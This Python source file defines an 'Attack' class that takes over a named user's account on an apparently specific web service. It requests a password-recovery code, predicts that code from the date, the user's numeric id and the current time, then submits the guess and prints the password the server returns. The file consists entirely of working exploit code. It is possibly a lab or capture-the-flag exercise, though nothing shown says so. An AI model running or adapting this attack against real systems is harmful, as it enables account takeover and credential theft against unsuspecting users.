from web_tools import *
import json
import datetime


class Attack(Web_tools):


    _code_letter = 'A'


    @classmethod
    def get_password(cls, target_name = "nataliw2") -> None:
        # ---------------------------------------------- #
        # This function get user password by getting password restore code of the user
        # :param target_name: the name of the user
        # :type target_name: str
        # :return: none
        # ---------------------------------------------- #

        super().server_session.session.post(super()._password_recovery_code_url, data = json.dumps(target_name))
        id = super().get_id(target_name)
        code = cls.create_code(id)
        ans = super().server_session.session.post(super()._password_recovery_code_verification, data = json.dumps([target_name, code]))
        password = ans.text
        print(f"[INFO] The password is {password}")


    @classmethod
    def create_code(cls, id: int) -> str:
        # ---------------------------------------------- #
        # This function calculates the registration code that will be senrt to the user
        # :param id: the id of target_user
        # :rtype id: int
        # :return: the possible code
        # :rtype: str
        # ---------------------------------------------- #
        
        code = ""
        date = datetime.datetime.today()
        code = str(date.strftime("%d%m"))
        for number in str(id):
            code += chr(ord(cls._code_letter) + int(number))

        code += str(date.strftime("%H%M"))

        return code

